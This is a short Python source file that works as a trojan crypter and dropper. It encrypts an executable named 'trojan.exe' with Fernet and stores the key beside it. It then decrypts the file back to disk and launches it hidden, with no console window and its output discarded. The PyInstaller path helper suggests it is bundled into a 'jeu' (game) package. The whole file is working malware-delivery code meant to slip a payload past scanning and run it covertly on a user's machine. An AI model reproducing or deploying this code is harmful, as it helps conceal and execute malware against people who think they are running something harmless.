import subprocess
from cryptography.fernet import Fernet
import os

def resource_path(relative_path):
    import sys, os
    if hasattr(sys, "_MEIPASS"):
        base_path = sys._MEIPASS
    else:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

def encryptFILE():
    key = Fernet.generate_key()

    with open (resource_path("trojan/key.txt"), "wb") as file :
        file.write(key)

    with open (resource_path("jeu/trojan.exe") , 'rb') as file:
        original = file.read()

    f =Fernet (key)
    encrypted = f.encrypt(original)


    with open(resource_path("trojan/program.enc"), "wb") as file:
        file.write(encrypted)


def decryptAndRun():
    with open(resource_path("trojan/key.txt"), 'rb') as file:
        key = file.read()

    f =Fernet (key)

    with open(resource_path("trojan/program.enc"), 'rb') as encrypted_file:
        encrypted = encrypted_file.read()

    decrypted = f.decrypt(encrypted)

    with open(resource_path("jeu/trojan.exe"), 'wb') as decrypted_file:
        decrypted_file.write(decrypted)



    #run
    trojan = subprocess.Popen(
    resource_path("jeu/trojan.exe"),
    stdout=subprocess.DEVNULL,
    stderr=subprocess.DEVNULL,
    creationflags=subprocess.CREATE_NO_WINDOW
	)
    
    return trojan
